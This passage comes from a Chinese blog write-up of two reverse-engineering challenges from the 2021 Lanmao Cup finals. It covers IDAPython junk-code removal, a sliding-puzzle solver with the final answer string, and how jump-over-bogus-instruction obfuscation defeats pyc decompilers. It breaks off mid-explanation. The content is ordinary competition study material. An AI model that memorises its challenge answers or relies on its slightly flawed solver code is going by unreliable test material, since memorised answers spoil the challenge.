        <content type="html"><![CDATA[<p>因为疫情原因，本来的北京国际会议中心的总决赛改成了线上，模式也从原来的awdplus改成了CTF解题赛，每个方向2个题。</p><p>这里来记录两道逆向题解，其中第二题因为在题目中嵌入了一个rsa密码学问题，比赛时一直卡着。<a id="more"></a></p><h3 id="abc"><a href="#abc" class="headerlink" title="abc"></a>abc</h3><p>题目中加了下面这种混淆，就是把要用的字符串或数据运算解密出来：</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210827115605895.png" alt="image-20210827115605895"></p><p>然后很多的同一类型花指令，简单用idapython去除一下就好，主要看看函数大体就可以了，调试就很快。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt;= <span class="number">0x401592</span>:</span><br><span class="line">    <span class="keyword">if</span> get_byte(addr) == <span class="number">0xe8</span> <span class="keyword">and</span> get_byte(addr+<span class="number">1</span>) == <span class="number">0x0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]:</span><br><span class="line">                patch_byte(addr+i, <span class="number">0x90</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">10</span>:</span><br><span class="line">                patch_byte(addr+i, <span class="number">0xe8</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(<span class="string">'*'</span>*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>对输入下内存断点，断到处理输入的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">sub_401308</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">int</span> *)(v3 - <span class="number">16</span>) &gt;= v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(v3 - <span class="number">128</span>) = __ROR4__(__ROL4__(<span class="number">-1109410466</span>, <span class="number">15</span>) ^ <span class="number">0xDEADBEEF</span>, <span class="number">10</span>);</span><br><span class="line">    *(_BYTE *)(v3 - <span class="number">127</span>) = __ROR4__(__ROL4__(<span class="number">-1109410466</span>, <span class="number">15</span>) ^ <span class="number">0xDEADBEEF</span>, <span class="number">10</span>);</span><br><span class="line">    *(_BYTE *)(v3 - <span class="number">126</span>) = __ROR4__(__ROL4__(<span class="number">-2048934564</span>, <span class="number">15</span>) ^ <span class="number">0xDEADBEEF</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> ( *(_DWORD *)(v3 - <span class="number">16</span>) = __ROR4__(__ROL4__(<span class="number">2111815003</span>, <span class="number">15</span>) ^ <span class="number">0xDEADBEEF</span>, <span class="number">10</span>);</span><br><span class="line">          (<span class="keyword">unsigned</span> __int64)*(<span class="keyword">int</span> *)(v3 - <span class="number">16</span>) &lt; <span class="number">3</span>;</span><br><span class="line">          *(_DWORD *)(v3 - <span class="number">16</span>) = *(_DWORD *)(v3 - <span class="number">16</span>) - <span class="number">118</span> + <span class="number">119</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4014B2();</span><br><span class="line">      *(_BYTE *)(*(<span class="keyword">int</span> *)(v3 - <span class="number">16</span>) + v3 - <span class="number">128</span>) = ~*(_BYTE *)(*(<span class="keyword">int</span> *)(v3 - <span class="number">16</span>) + v3 - <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401718();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++*(_DWORD *)(v3 - <span class="number">16</span>);</span><br><span class="line">    sub_40133C();</span><br><span class="line">    v5 = *v4;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'#'</span>:</span><br><span class="line">        sub_400A65();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'$'</span>:</span><br><span class="line">        sub_40085B(a1, a2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">        sub_400B6D();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'@'</span>:</span><br><span class="line">        sub_40095D(a1, a2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_4013EE();</span><br><span class="line">        sub_400C6F(a1, a2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试可以知道，我们的输入要对应case语句的4个参数。</p><p>看到第一个case对应的处理函数：就是对box进行数据换位置。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/dnZxkKX4hrNo9QI.png" alt="image-20210824170542878"></p><p>再看最后的判断条件:</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/d1xvJuFYPj6hUTm.png" alt="image-20210824171449397"></p><p>从上可以抽象出来是一个4*4的华容道游戏。</p><p>开始我是写的一个dfs来搜索，因为限定条件比较少，很花时间，算法太菜了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">1</span>, <span class="number">0x0A</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0x0D</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">-1</span>, <span class="number">7</span>, <span class="number">0x0B</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">8</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> d[] = <span class="string">"#$%@"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>  </span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> tmp = a[index];</span><br><span class="line">a[index] = a[index+<span class="number">1</span>];</span><br><span class="line">a[index+<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> tmp = a[index];</span><br><span class="line">a[index] = a[index<span class="number">-4</span>];</span><br><span class="line">a[index<span class="number">-4</span>] = tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun3</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> tmp = a[index];</span><br><span class="line">a[index] = a[index<span class="number">-1</span>];</span><br><span class="line">a[index<span class="number">-1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun4</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> tmp = a[index];</span><br><span class="line">a[index] = a[index+<span class="number">4</span>];</span><br><span class="line">a[index+<span class="number">4</span>] = tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_index</span><span class="params">(<span class="keyword">char</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">index = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> index;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] != i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> <span class="built_in">step</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(check(a))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %s"</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">step</span> &gt; <span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *tmp = (<span class="keyword">char</span> *)alloca(<span class="number">16</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmp, enc, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">int</span> index = find_index(enc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((i == <span class="number">0</span> &amp;&amp; (index%<span class="number">4</span>) &gt;= <span class="number">3</span>) || (i == <span class="number">1</span> &amp;&amp; (index/<span class="number">4</span>) &lt;= <span class="number">0</span>) || (i == <span class="number">2</span> &amp;&amp; (index%<span class="number">4</span>) &lt;= <span class="number">0</span>) || (i == <span class="number">3</span> &amp;&amp; (index/<span class="number">4</span>) &gt;= <span class="number">3</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[<span class="built_in">step</span>] = d[i];</span><br><span class="line">fun1(enc, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[<span class="built_in">step</span>] = d[i];</span><br><span class="line">fun2(enc, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[<span class="built_in">step</span>] = d[i];</span><br><span class="line">fun3(enc, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[<span class="built_in">step</span>] = d[i];</span><br><span class="line">fun4(enc, index);</span><br><span class="line">&#125;</span><br><span class="line">dfs(enc, <span class="built_in">step</span>+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(enc, tmp, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*for(int i = 0; i &lt; 4; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">for(int j = 0; j &lt; 4; j++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%02d ", enc[4*i+j]);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">putchar(10);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dfs(enc, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后找到github上一个解华容道的项目<a href="https://github.com/Dpxx/Klotski-15puzzles" target="_blank" rel="noopener">https://github.com/Dpxx/Klotski-15puzzles</a></p><p>快的离谱：</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/f73BUQgtNKLo6Tb.png" alt="image-20210824171658704"></p><p>最后转化一下：<strong>$$##$$%%@@##$$%%@@</strong></p><h3 id="en"><a href="#en" class="headerlink" title="en"></a>en</h3><p>这个题目最后也只有2解。我比赛时一直卡在rsa算法上，没想到逆向题还真就嵌入一个rsa的题。</p><p>通过这个题学习基本的pyc文件，对对抗混淆做好基础。</p><p>看题目的给的密文，加上看pyc文件中的字符串可以猜测是rsa加密。</p><p>尝试使用uncompyle6对该pyc文件反编译，报错。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210827120432079.png" alt="image-20210827120432079"></p><p>这个问题了解过的原因基本上就是对字节码加了混淆，如下面举例这个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   <span class="number">1</span>           <span class="number">0</span> JUMP_ABSOLUTE        [<span class="number">71</span> <span class="number">06</span> <span class="number">00</span>]     <span class="number">6</span> </span><br><span class="line">|               <span class="number">3</span> LOAD_CONST           [<span class="number">64</span> FF FF] <span class="number">65535</span> (FAKE!)</span><br><span class="line">|         &gt;&gt;    <span class="number">6</span> LOAD_CONST           [<span class="number">64</span> <span class="number">00</span> <span class="number">00</span>]     <span class="number">0</span> (Hello World)</span><br><span class="line">|               <span class="number">9</span> PRINT_ITEM           [<span class="number">47</span> -- --]</span><br><span class="line">|              <span class="number">10</span> PRINT_NEWLINE        [<span class="number">48</span> -- --]</span><br><span class="line">|              <span class="number">11</span> LOAD_CONST           [<span class="number">64</span> <span class="number">01</span> <span class="number">00</span>]     <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line">|              <span class="number">14</span> RETURN_VALUE         [<span class="number">53</span> -- --]</span><br></pre></td></tr></table></figure><p>我们看到第二条指令<strong>3 LOAD_CONST           [64 FF FF] 65535</strong>，对于如何解析这个指令我们可以看到这两篇官方文档：<a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">https://docs.python.org/2/library/dis.html</a>    <a href="https://github.com/Python/cpython/blob/2.7/Include/opcode.h" target="_blank" rel="noopener">https://github.com/Python/cpython/blob/2.7/Include/opcode.h</a></p><p><strong>64 FF FF</strong>是实际在pyc文件中存放的字节码，也是这一条指令的组成，其中64是表示操作指令，FF FF表示所带参数。（在字节码对象的co_code中分为无参数指令（1字节）和有参数指令（3字节））。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210827133938306.png" alt="image-20210827133938306"></p><p>所以第二条指令的意思就是加载代码对象的常量表的第65535项到栈顶，常量表是存储了一个PyCodeObject中的常量的数组。而这里的index是65535，显然是超过了这个数组的大小。报的错也是数组越界。</p><p>但是第一条指令是一个绝对跳转，它跳到了编号为6的位置（也就是用&gt;&gt;符号标明了的）进而跳过他后面一条错误指令（3 LOAD_CONST）的执行。</p><p>所以实际执行的指令其实是这样：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|               <span class="number">6</span> LOAD_CONST           [<span class="number">64</span> <span class="number">00</span> <span class="number">00</span>]     <span class="number">0</span> (Hello World)</span><br><span class="line">|               <span class="number">9</span> PRINT_ITEM           [<span class="number">47</span> -- --]</span><br><span class="line">|              <span class="number">10</span> PRINT_NEWLINE        [<span class="number">48</span> -- --]</span><br><span class="line">|              <span class="number">11</span> LOAD_CONST           [<span class="number">64</span> <span class="number">01</span> <span class="number">00</span>]     <span class="number">1</span> (None)</span><br><span class="line">|              <span class="number">14</span> RETURN_VALUE         [<span class="number">53</span> -- --]</span><br></pre></td></tr></table></figure><p>我们实验一下如何看一个PyCodeObject中常量的个数，如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    a = <span class="number">12</span></span><br><span class="line"><span class="meta">... </span>    b = <span class="number">13</span></span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.__code__</span><br><span class="line">&lt;code object p at <span class="number">0x000002509037CEA0</span>, file <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = p.__code__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="number">12</span>, <span class="number">13</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>这里提到了PyCodeObject，那什么是PyCodeObject呢。</p><p>从code.h头文件中找到它的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bytecode object */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="keyword">int</span> co_argcount;        <span class="comment">/* #arguments, except *args */</span></span><br><span class="line">    <span class="keyword">int</span> co_nlocals;     <span class="comment">/* #local variables */</span></span><br><span class="line">    <span class="keyword">int</span> co_stacksize;       <span class="comment">/* #entries needed for evaluation stack */</span></span><br><span class="line">    <span class="keyword">int</span> co_flags;       <span class="comment">/* CO_..., see below */</span></span><br><span class="line">    PyObject *co_code;      <span class="comment">/* instruction opcodes */</span></span><br><span class="line">    PyObject *co_consts;    <span class="comment">/* list (constants used) */</span></span><br><span class="line">    PyObject *co_names;     <span class="comment">/* list of strings (names used) */</span></span><br><span class="line">    PyObject *co_varnames;  <span class="comment">/* tuple of strings (local variable names) */</span></span><br><span class="line">    PyObject *co_freevars;  <span class="comment">/* tuple of strings (free variable names) */</span></span><br><span class="line">    PyObject *co_cellvars;      <span class="comment">/* tuple of strings (cell variable names) */</span></span><br><span class="line">    <span class="comment">/* The rest doesn't count for hash/cmp */</span></span><br><span class="line">    PyObject *co_filename;  <span class="comment">/* string (where it was loaded from) */</span></span><br><span class="line">    PyObject *co_name;      <span class="comment">/* string (name, for reference) */</span></span><br><span class="line">    <span class="keyword">int</span> co_firstlineno;     <span class="comment">/* first source line number */</span></span><br><span class="line">    PyObject *co_lnotab;    <span class="comment">/* string (encoding addr&lt;-&gt;lineno mapping) See</span></span><br><span class="line"><span class="comment">                   Objects/lnotab_notes.txt for details. */</span></span><br><span class="line">    <span class="keyword">void</span> *co_zombieframe;     <span class="comment">/* for optimization only (see frameobject.c) */</span></span><br><span class="line">    PyObject *co_weakreflist;   <span class="comment">/* to support weakrefs to code objects */</span></span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure><p>在我们写好python代码，执行的时候它是先编译成pyc字节码，再通过解释执行pyc字节码。pyc文件PyCodeObject对象的持久化保存方式。 它按照python代码中代码的作用域来划分成PyCodeObject的。</p><p>写了如下简单的py代码来实验：</p><p>它就应该是有3个PyCodeObject的，一个整体的module，和funa，q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funa</span><span class="params">()</span>:</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funb</span><span class="params">(self)</span>:</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">funa()</span><br><span class="line">q().funb()</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m py_compile 1.py</span><br></pre></td></tr></table></figure><p>载入生成的1.pyc文件到010editor使用模板查看：一个大的module对象的object consts包括了funa，q的PyCodeObject对象。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210827150600761.png" alt="image-20210827150600761"></p><p>整体上来说这个pyc文件格式是很简单的，很多结构都是：<strong>类型+长度+内容</strong> 的格式。</p><p>回到做题的时候来。上面是用绝对跳转跳过错误代码的混淆字节码方式，其它还有虚假分支，重叠之类等，他们的原理其实都是差不多的，和x86平台下加的一般花指令极其类似。</p><p>然后回到这个题目上来，因为使用uncomple6没有反编译成功，我去尝试了使用<strong>marshal</strong>来反序列化pyc文件中的PyCodeObject，再使用diss模块进行反汇编。</p><blockquote><p>注意：</p><p>pyc文件由三部分组成<strong>magic number + 源代码文件信息 + PyCodeObject</strong></p><p>不同版本的python编译的pyc文件的<strong>magic number + 源代码文件信息</strong>都是不同的。</p><p>python2.7中除了4字节的<strong>magic number</strong>还有4字节的时间戳，所以<strong>PyCodeObject</strong>在第8个字节后面。</p><p>python3.5与python3.6在python2.7的基础上还多了4字节的源文件大小，所以<strong>PyCodeObject</strong>在12字节后面。</p><p>python3.7以上还增加了校验hash值，当4-8字节为全0时表示没有启用hash校验，其后的8-16字节表示时间戳与源文件大小；但当4-8字节为0100 0000或者0300 